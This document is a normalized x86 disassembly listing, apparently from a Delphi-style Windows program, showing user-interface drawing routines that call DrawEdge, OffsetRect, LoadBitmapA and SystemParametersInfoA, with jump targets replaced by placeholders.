mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_45adfc
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_424210
mov eax [ ebp + 0x8 ]
inc [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_45daf8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_423d10
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424a70
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_424508
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_423a44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_403174
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424a70
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_45daf8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e637
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
sub eax 0xa
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_45cbbc
mov ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_45daf8
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_45e650
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_45ef58
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4245fc
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_424210
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_423a44
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_4042f8
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_424210
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4245fc
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x2
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_45ab0c
cmp ebx eax
jl r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424a70
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_424208
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_424210
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_424210
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4245fc
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_424208
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_429254
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_4241e4
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4245fc
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4245fc
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_427168
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_45ea9b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_428250
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_423a44
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_45ab0c
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_424210
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_45daf8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x5c ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_423d10
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424a70
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424798
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_45adfc
jmp r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424a70
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_424508
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_423a44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_403174
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_45daf8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ef5f
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_45cbbc
mov eax [ ebp + 0x8 ]
mov [ eax - 0x20 ] 0xa
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov edx [ ebp - 0x4 ]
call sub_4248d0
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x20 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ ebp - 0x4 ]
call sub_45daf8
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_45f0ac
push ebx
xor ebx ebx
mov edx [ eax + 0x64 ]
jmp r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
cmp [ edx + 0x7c ] 0x0
je r-xdata
call sub_45fa90
test eax eax
je r-xdata
mov ebx [ edx + 0x7c ]
jmp r-xdata
mov edx [ edx + 0x64 ]
mov eax ebx
pop ebx
retn
mov ebx [ eax + 0x48 ]
sub_45f0dc
push ebp
mov ebp esp
add esp 0xfffffeac
mov [ ebp - 0x154 ] 0x154
push 0x0
lea eax [ ebp - 0x154 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xbc ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xb8 ]
mov [ eax ] edx
sub_45f128
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov edi eax
xor eax eax
push ebp
push sub_45f30a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov si 0xfff2
call sub_403370
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
xor ebx ebx
mov bl 0x1
push ebp
call sub_45f0dc
pop ecx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x5
